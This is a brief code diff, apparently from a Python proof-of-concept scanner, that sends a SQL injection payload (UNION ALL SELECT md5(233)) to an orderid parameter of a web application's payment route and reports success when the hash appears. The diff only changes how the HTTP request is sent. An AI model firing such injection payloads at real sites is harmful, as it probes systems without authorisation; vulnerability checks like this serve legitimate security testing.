@@ -26,7 +26,9 @@ def check(url):
     payload = '?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+'
 
     try:
-        r = requests.get(url + payload, headers=headers)
+        s = requests.session()
+        s.keep_alive = False
+        r = s.get(url + payload, headers=headers)
         # md5(233)
         if "e165421110ba03099a1c0393373c5b43" in r.text:
             print("成功")
